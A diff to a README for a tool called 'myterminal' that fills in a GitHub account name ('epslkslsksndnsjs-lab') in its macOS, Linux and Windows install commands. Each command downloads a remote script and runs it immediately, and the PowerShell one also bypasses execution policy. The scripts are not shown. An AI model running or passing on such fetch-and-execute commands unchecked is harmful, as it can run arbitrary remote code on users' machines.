@@ -17,19 +17,19 @@ You do not need Git, Node.js, Bun, or another programming environment beforehand
 #### macOS
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com//myterminal/v0.1.0/scripts/install-macos.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/epslkslsksndnsjs-lab/myterminal/v0.1.0/scripts/install-macos.sh)"
 ```
 
 #### Linux
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com//myterminal/v0.1.0/scripts/install-linux.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/epslkslsksndnsjs-lab/myterminal/v0.1.0/scripts/install-linux.sh)"
 ```
 
 #### Windows PowerShell
 
 ```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com//myterminal/v0.1.0/scripts/install-windows.ps1 | iex"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/epslkslsksndnsjs-lab/myterminal/v0.1.0/scripts/install-windows.ps1 | iex"
 ```
 
 > [!IMPORTANT]
